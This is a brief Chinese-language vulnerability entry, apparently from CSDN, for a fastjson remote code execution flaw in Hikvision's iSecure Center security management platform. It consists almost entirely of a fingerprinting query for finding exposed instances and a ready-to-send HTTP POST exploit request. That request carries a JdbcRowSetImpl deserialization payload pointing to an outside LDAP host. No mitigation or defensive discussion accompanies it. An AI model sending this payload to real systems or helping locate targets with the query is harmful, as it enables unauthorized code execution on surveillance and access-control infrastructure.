## 漏洞名称

[海康威视](https://so.csdn.net/so/search?q=海康威视&spm=1001.2101.3001.7020)综合安防管理平台 `iSecure Center applyCT fastjson` [远程代码执行](https://so.csdn.net/so/search?q=远程代码执行&spm=1001.2101.3001.7020)

## 搜索引擎

app="HIKVISION-综合安防管理平台"

```yaml
POST /bic/ssoService/v1/applyCT HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/json
Content-Length: 196

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnslog.cn","autoCommit":true},"hfe4zyyzldp":"="}

```

